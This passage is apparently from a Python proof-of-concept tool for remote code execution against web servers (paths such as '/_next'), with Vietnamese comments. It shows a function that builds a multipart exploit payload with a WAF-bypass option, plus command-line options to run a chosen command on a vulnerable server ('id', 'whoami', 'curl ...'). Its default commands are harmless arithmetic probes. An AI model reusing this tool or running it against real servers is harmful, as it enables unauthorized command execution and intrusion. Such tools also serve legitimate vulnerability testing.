...
def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, custom_cmd: Optional[str] = None) -> tuple[str, str]:
    """Build the RCE PoC multipart form data payload."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    # Xác định lệnh thực thi
    if custom_cmd:
        cmd = custom_cmd
    elif windows:
        cmd = 'powershell -c \"41*271\"'  # fallback cho Windows
    else:
        cmd = 'echo $((41*271))'          # fallback mặc định
...
Examples:
  ...
  %(prog)s -u https://example.com --cmd "id"
  %(prog)s -u https://example.com --windows --cmd "whoami"
        """
    )
    ...
    parser.add_argument(
        ...
        action="append",
        dest="paths",
        help="Custom path to test (e.g., '/_next', '/api'). Can be used multiple times"
    )

    parser.add_argument(
        "--path-file",
        help="File containing list of paths to test (one per line)"
    )
    ...
    parser.add_argument(
        ...
        type=str,
        default=None,
        help="Custom command to execute on vulnerable server (e.g. 'id', 'whoami', 'curl ...')"
    )
    ...
    if not args.quiet:
        ...
        if args.cmd:
            print(colorize(f"[*] Custom command: {args.cmd}", Colors.MAGENTA))
        if args.insecure:
